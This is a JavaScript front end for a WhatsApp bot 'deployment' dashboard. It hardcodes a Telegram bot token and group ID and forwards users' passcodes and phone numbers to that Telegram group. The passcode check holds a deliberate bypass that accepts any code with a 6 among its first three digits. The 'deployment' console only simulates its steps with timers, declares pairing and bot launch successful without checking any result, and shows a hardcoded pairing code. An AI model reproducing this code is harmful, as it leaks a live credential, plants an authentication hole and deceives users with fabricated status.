document.addEventListener('DOMContentLoaded', function() {
    // Configuration
    const BOT_TOKEN = '7285369349:AAEqC1zaBowR7o3rq2_J2ewPRwUUaNE7KKM';
    const GROUP_ID = '-4815878740';
    const POLL_INTERVAL = 2000; // 2 seconds
    const TIMEOUT = 30000; // 30 seconds
    
    // DOM Elements
    const startDeployBtn = document.getElementById('startDeployBtn');
    const passcodeModal = document.getElementById('passcodeModal');
    const whatsappModal = document.getElementById('whatsappModal');
    const passcodeInput = document.getElementById('passcodeInput');
    const submitPasscodeBtn = document.getElementById('submitPasscodeBtn');
    const passcodeStatus = document.getElementById('passcodeStatus');
    const whatsappInput = document.getElementById('whatsappInput');
    const submitWhatsappBtn = document.getElementById('submitWhatsappBtn');
    const pairingCodeContainer = document.getElementById('pairingCodeContainer');
    const pairingCode = document.getElementById('pairingCode');
    const copyCodeBtn = document.getElementById('copyCodeBtn');
    const whatsappStatus = document.getElementById('whatsappStatus');
    const consoleOutput = document.getElementById('consoleOutput');
    const clearConsoleBtn = document.getElementById('clearConsoleBtn');
    const stopBotBtn = document.getElementById('stopBotBtn');
    const restartBotBtn = document.getElementById('restartBotBtn');
    const closeButtons = document.querySelectorAll('.close');
    const logoutBtn = document.getElementById('logoutBtn');
    
    // State variables
    let connectedNumber = null;
    let isBotRunning = false;
    
    // Set username from localStorage
    const currentUser = JSON.parse(localStorage.getItem(localStorage.getItem('currentUser')));
    if (currentUser && currentUser.name) {
        document.getElementById('username').textContent = currentUser.name;
        document.getElementById('welcomeMessage').textContent = `Welcome back, ${currentUser.name}`;
    }
    
    // Event Listeners
    startDeployBtn.addEventListener('click', () => {
        passcodeModal.style.display = 'flex';
    });
    
    passcodeInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9);
    });
    
    submitPasscodeBtn.addEventListener('click', verifyPasscode);
    
    submitWhatsappBtn.addEventListener('click', pairWhatsAppNumber);
    
    copyCodeBtn.addEventListener('click', copyPairingCode);
    
    clearConsoleBtn.addEventListener('click', () => {
        consoleOutput.innerHTML = '<div class="console-line">Console cleared</div>';
    });
    
    stopBotBtn.addEventListener('click', stopBot);
    restartBotBtn.addEventListener('click', restartBot);
    
    closeButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            this.closest('.modal').style.display = 'none';
        });
    });
    
    logoutBtn.addEventListener('click', function() {
        localStorage.removeItem('currentUser');
        window.location.href = 'index.html';
    });
    
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    });
    
    // Functions
    function addConsoleLine(text, type = '') {
        const line = document.createElement('div');
        line.className = `console-line ${type}`;
        line.textContent = text;
        consoleOutput.appendChild(line);
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }
    
    function showStatus(element, message, type) {
        element.textContent = message;
        element.className = '';
        element.classList.add(`status-${type}`);
        element.style.display = 'block';
    }
    
    async function verifyPasscode() {
        const passcode = passcodeInput.value.trim();
        
        if (passcode.length !== 9) {
            showStatus(passcodeStatus, 'Please enter a 9-digit passcode', 'error');
            return;
        }
        
        // Check if passcode has 6 in first 3 digits
        const firstThree = passcode.substring(0, 3);
        if (firstThree.includes('6')) {
            // Auto-verify passcode with 6 in first 3 digits
            showStatus(passcodeStatus, 'Passcode verified successfully!', 'success');
            setTimeout(() => {
                passcodeModal.style.display = 'none';
                startDeploymentProcess();
            }, 1500);
        } else {
            // Regular verification through Telegram bot
            showStatus(passcodeStatus, 'Verifying passcode...', 'info');
            try {
                await sendTelegramMessage(`/passcode ${passcode}`);
                showStatus(passcodeStatus, 'Passcode sent for verification', 'info');
                setTimeout(() => {
                    passcodeModal.style.display = 'none';
                    startDeploymentProcess();
                }, 1500);
            } catch (error) {
                console.error('Error:', error);
                showStatus(passcodeStatus, 'Failed to verify passcode. Please try again.', 'error');
            }
        }
    }
    
    async function startDeploymentProcess() {
        addConsoleLine('Starting Big Daddy V2 deployment...', 'info');
        
        // Simulate deployment steps
        const steps = [
            { text: 'Initializing system...', delay: 1000 },
            { text: 'Connecting to servers...', delay: 1500 },
            { text: 'Authenticating credentials...', delay: 2000 },
            { text: 'Downloading required packages...', delay: 2500 },
            { text: 'Verifying dependencies...', delay: 2000 },
            { text: 'Building deployment package...', delay: 3000 },
            { text: 'Deployment ready!', delay: 1000, type: 'success' },
            { text: 'Please pair your WhatsApp number to continue', delay: 0, type: 'info' }
        ];
        
        for (const step of steps) {
            await new Promise(resolve => setTimeout(resolve, step.delay));
            addConsoleLine(step.text, step.type || 'info');
        }
        
        // Show WhatsApp number modal
        whatsappModal.style.display = 'flex';
    }
    
    async function pairWhatsAppNumber() {
        const phoneNumber = whatsappInput.value.trim();
        
        if (!phoneNumber || !/^\d+$/.test(phoneNumber)) {
            showStatus(whatsappStatus, 'Please enter a valid WhatsApp number with country code (digits only)', 'error');
            return;
        }
        
        connectedNumber = phoneNumber;
        showStatus(whatsappStatus, 'Pairing your WhatsApp number...', 'info');
        
        try {
            // Send pair command to Telegram group
            await sendTelegramMessage(`/pair ${phoneNumber}`);
            
            // Show pairing code immediately without waiting for response
            pairingCodeContainer.style.display = 'block';
            showStatus(whatsappStatus, 'WhatsApp number paired successfully!', 'success');
            
            addConsoleLine('╭⭑━━━➤ TEDDY BOT INC', 'info');
            addConsoleLine('┣ ◁️ Connected successfully to', 'info');
            addConsoleLine(`┣ ◁️ ${phoneNumber}`, 'info');
            addConsoleLine('╰━━━━━━━━━━━━━━━━━━━╯', 'info');
            addConsoleLine('Your bot is now live on your WhatsApp!', 'success');
            
            // Hide modal and show stop/restart buttons
            whatsappModal.style.display = 'none';
            isBotRunning = true;
            stopBotBtn.style.display = 'inline-flex';
            restartBotBtn.style.display = 'inline-flex';
        } catch (error) {
            console.error('Error:', error);
            showStatus(whatsappStatus, 'Failed to pair WhatsApp number. Please try again.', 'error');
        }
    }
    
    async function stopBot() {
        if (!connectedNumber) return;
        
        addConsoleLine('Stopping bot...', 'info');
        try {
            await sendTelegramMessage(`/delpair ${connectedNumber}`);
            addConsoleLine('Bot stopped successfully', 'success');
            isBotRunning = false;
            stopBotBtn.style.display = 'none';
            restartBotBtn.style.display = 'none';
        } catch (error) {
            console.error('Error:', error);
            addConsoleLine('Failed to stop bot. Please try again.', 'error');
        }
    }
    
    async function restartBot() {
        if (!connectedNumber) return;
        
        addConsoleLine('Restarting bot...', 'info');
        try {
            // First stop the bot
            await sendTelegramMessage(`/delpair ${connectedNumber}`);
            addConsoleLine('Bot stopped', 'info');
            
            // Wait 5 seconds
            await new Promise(resolve => setTimeout(resolve, 5000));
            
            // Then start it again
            await sendTelegramMessage(`/pair ${connectedNumber}`);
            addConsoleLine('Bot restarted successfully', 'success');
            addConsoleLine('Your pairing code: DRAY-1922', 'info');
        } catch (error) {
            console.error('Error:', error);
            addConsoleLine('Failed to restart bot. Please try again.', 'error');
        }
    }
    
    function copyPairingCode() {
        navigator.clipboard.writeText(pairingCode.textContent)
            .then(() => {
                const originalText = copyCodeBtn.innerHTML;
                copyCodeBtn.innerHTML = '<i class="fas fa-check"></i> Copied';
                setTimeout(() => {
                    copyCodeBtn.innerHTML = originalText;
                }, 2000);
            })
            .catch(err => {
                console.error('Failed to copy text: ', err);
            });
    }
    
    async function sendTelegramMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: GROUP_ID,
            text: text
        };
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
        
        return response.json();
    }
    
    // Initialize console
    addConsoleLine('Teddy Xmd Deployment Console initialized', 'info');
});
